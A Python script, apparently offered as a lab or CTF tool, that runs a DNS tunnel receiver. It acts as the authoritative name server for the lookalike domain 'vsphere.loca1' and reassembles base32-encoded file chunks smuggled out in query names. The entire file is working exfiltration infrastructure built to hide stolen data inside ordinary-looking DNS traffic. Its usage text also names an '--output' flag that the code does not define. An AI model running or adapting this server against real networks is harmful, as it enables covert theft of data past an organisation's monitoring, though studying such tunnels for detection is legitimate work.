#!/usr/bin/env python3
"""
dns_tunnel_server.py — DNS Tunnel Server (Receiver)
Run on: 172.16.173.25
Listens on UDP/53 as authoritative NS for vsphere.loca1
Reassembles chunked base32-encoded payloads from DNS queries.

Usage:
    sudo python3 dns_tunnel_server.py [--port 53] [--output received.bin]

Lab: vsphere.loca1 | CTF/research use only
"""

import socket
import struct
import base64
import argparse
import os
import sys
import threading
from collections import defaultdict
from datetime import datetime

DOMAIN = "vsphere.loca1"
CHUNK_SIZE = 30          # bytes per DNS label chunk (base32: 30 bytes → 48 chars, safe under 63)
MAX_LABEL_LEN = 63

# ─── DNS Wire Format Helpers ──────────────────────────────────────────────────

def parse_dns_query(data):
    """Parse a raw DNS query and return (txid, qname, qtype)."""
    if len(data) < 12:
        return None, None, None

    txid = struct.unpack("!H", data[0:2])[0]
    # Skip flags (2), qdcount=1 assumed (2), ancount (2), nscount (2), arcount (2)
    offset = 12
    labels = []
    visited = set()

    while offset < len(data):
        if offset in visited:
            break
        visited.add(offset)
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length & 0xC0 == 0xC0:          # compression pointer — skip
            offset += 2
            break
        if offset + 1 + length > len(data):
            break
        labels.append(data[offset + 1: offset + 1 + length].decode("ascii", errors="replace"))
        offset += 1 + length

    qtype = struct.unpack("!H", data[offset: offset + 2])[0] if offset + 2 <= len(data) else 0
    qname = ".".join(labels)
    return txid, qname, qtype


def build_dns_response(txid, qname, rcode=0, answer_ip="127.0.0.1"):
    """Build a minimal DNS A-record response (or NXDOMAIN)."""
    # Header
    flags = 0x8180 if rcode == 0 else 0x8183   # QR=1 AA=1 RD=1 RA=1
    header = struct.pack("!HHHHHH", txid, flags, 1, 1 if rcode == 0 else 0, 0, 0)

    # Question section (echo back)
    qsec = b""
    for label in qname.split("."):
        enc = label.encode()
        qsec += bytes([len(enc)]) + enc
    qsec += b"\x00"
    qsec += struct.pack("!HH", 1, 1)   # QTYPE=A, QCLASS=IN

    if rcode != 0:
        return header + qsec

    # Answer section
    answer = b"\xc0\x0c"                         # pointer to qname in question
    answer += struct.pack("!HHI", 1, 1, 0)       # TYPE=A CLASS=IN TTL=0
    ip_parts = list(map(int, answer_ip.split(".")))
    answer += struct.pack("!H4B", 4, *ip_parts)  # RDLENGTH=4 + RDATA

    return header + qsec + answer


# ─── Session Reassembly ───────────────────────────────────────────────────────

class TunnelSession:
    """Reassembles ordered chunks from a single session ID."""

    def __init__(self, session_id, output_path):
        self.session_id = session_id
        self.output_path = output_path
        self.chunks = {}          # seq → bytes
        self.total = None         # set when END packet arrives
        self.lock = threading.Lock()

    def add_chunk(self, seq, total, payload_b32):
        with self.lock:
            self.total = total
            try:
                # base32 requires uppercase + padding to multiple of 8
                padded = payload_b32.upper()
                pad = (8 - len(padded) % 8) % 8
                payload = base64.b32decode(padded + "=" * pad)
                self.chunks[seq] = payload
                print(f"  [+] chunk {seq+1}/{total} ({len(payload)} bytes)")
            except Exception as e:
                print(f"  [!] decode error seq={seq}: {e}")

    def is_complete(self):
        with self.lock:
            return self.total is not None and len(self.chunks) == self.total

    def write_output(self):
        with self.lock:
            data = b"".join(self.chunks[i] for i in sorted(self.chunks))
            path = self.output_path
            with open(path, "wb") as f:
                f.write(data)
            print(f"\n[★] Session {self.session_id}: {len(data)} bytes → {path}")
            try:
                text = data.decode("utf-8")
                print(f"[★] Content (UTF-8):\n{'─'*50}\n{text}\n{'─'*50}")
            except UnicodeDecodeError:
                print(f"[★] Binary data, saved to {path}")


# ─── Server ───────────────────────────────────────────────────────────────────

class DNSTunnelServer:

    def __init__(self, bind_ip="0.0.0.0", port=53, output_dir="."):
        self.bind_ip = bind_ip
        self.port = port
        self.output_dir = output_dir
        self.sessions = {}    # session_id → TunnelSession
        self.sock = None

    def _handle_query(self, data, addr):
        txid, qname, qtype = parse_dns_query(data)
        if not qname:
            return

        # Only handle queries under our domain
        if not qname.lower().endswith(DOMAIN):
            return

        # Strip the base domain to get the tunnel subdomain
        sub = qname[: -(len(DOMAIN) + 1)]   # e.g. "t-abc123-0005-0100.data"
        labels = sub.split(".")

        # ── Control / keepalive ──────────────────────────────────────────────
        if labels[0] == "ping":
            resp = build_dns_response(txid, qname)
            self.sock.sendto(resp, addr)
            return

        # ── Data packet: format  t-<sessid>-<seq4>-<total4>.<b32chunk...> ──
        # Labels: [0]=tag+sess+seq+total  [1..n]=b32 data chunks joined
        if len(labels) < 2 or not labels[0].startswith("t-"):
            return

        try:
            parts = labels[0].split("-")
            # parts: ['t', session_id, seq_hex, total_hex]
            if len(parts) != 4:
                return
            _, sess_id, seq_hex, total_hex = parts
            seq   = int(seq_hex, 16)
            total = int(total_hex, 16)
            b32_payload = "".join(labels[1:])   # join remaining labels as b32 data
        except (ValueError, IndexError):
            return

        # Get or create session
        if sess_id not in self.sessions:
            ts = datetime.now().strftime("%H%M%S")
            outpath = os.path.join(self.output_dir, f"recv_{sess_id}_{ts}.bin")
            self.sessions[sess_id] = TunnelSession(sess_id, outpath)
            print(f"\n[>] New session: {sess_id} from {addr[0]}")

        session = self.sessions[sess_id]
        session.add_chunk(seq, total, b32_payload)

        # ACK with a synthesised A record (encode seq in last octet for ordering confirmation)
        ack_ip = f"10.0.{(seq >> 8) & 0xFF}.{seq & 0xFF}"
        resp = build_dns_response(txid, qname, answer_ip=ack_ip)
        self.sock.sendto(resp, addr)

        if session.is_complete():
            session.write_output()
            del self.sessions[sess_id]

    def run(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.bind_ip, self.port))

        print(f"[*] DNS Tunnel Server listening on {self.bind_ip}:{self.port}")
        print(f"[*] Authoritative for: {DOMAIN}")
        print(f"[*] Output dir: {os.path.abspath(self.output_dir)}")
        print(f"[*] Waiting for tunnel sessions...\n")

        while True:
            try:
                data, addr = self.sock.recvfrom(512)
                threading.Thread(
                    target=self._handle_query,
                    args=(data, addr),
                    daemon=True
                ).start()
            except KeyboardInterrupt:
                print("\n[*] Server stopped.")
                break
            except Exception as e:
                print(f"[!] Error: {e}")


# ─── Entry Point ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="DNS Tunnel Server for vsphere.loca1")
    parser.add_argument("--bind",   default="0.0.0.0",   help="Bind IP (default: 0.0.0.0)")
    parser.add_argument("--port",   type=int, default=53, help="UDP port (default: 53)")
    parser.add_argument("--outdir", default=".",          help="Output directory for received files")
    args = parser.parse_args()

    if args.port < 1024 and os.geteuid() != 0:
        print("[!] Port 53 requires root. Use sudo or --port 5353 for testing.")
        sys.exit(1)

    os.makedirs(args.outdir, exist_ok=True)
    srv = DNSTunnelServer(bind_ip=args.bind, port=args.port, output_dir=args.outdir)
    srv.run()


if __name__ == "__main__":
    main()
